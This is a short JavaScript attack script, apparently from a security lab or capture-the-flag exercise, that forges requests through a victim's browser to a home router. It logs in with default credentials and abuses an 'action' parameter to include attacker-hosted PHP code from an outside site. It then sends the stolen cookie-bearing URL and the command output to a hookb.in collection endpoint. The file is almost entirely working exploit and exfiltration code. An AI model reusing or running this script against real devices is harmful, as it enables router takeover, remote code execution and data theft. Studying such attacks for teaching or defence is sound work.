// This us the script linked to from router.pdf.php, which
// forges a request through Bob's router to router.local

let cook = document.cookie;

let http = new XMLHttpRequest();
let url = cook + '&username=' + 'admin' + '&pin=' + 'password' + '&notRobot=on';
http.open('POST', 'http://router.local/login.php', true);
//'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
//http://router.local/view.php
//http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)

http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

http.onload = function () {
    let xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://hookb.in/b90qZd1nMehKGq00yEYm', true);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify(http.responseURL));
};

http.onreadystatechange = function () {
    if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
        if (http.responseURL === 'http://router.local/home.php?action=view&' + cook) {
            let req = new XMLHttpRequest();
            req.open(
                'POST',
                'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&' + cook,
                true
            );
            req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            req.onload = function () {
                let r = new XMLHttpRequest();
                r.open('POST', 'https://hookb.in/b90qZd1nMehKGq00yEYm', true);
                r.setRequestHeader('Content-type', 'application/json');
                r.send(JSON.stringify(req.responseText));
            };
            req.send();
        }
    }
};
http.send(url);
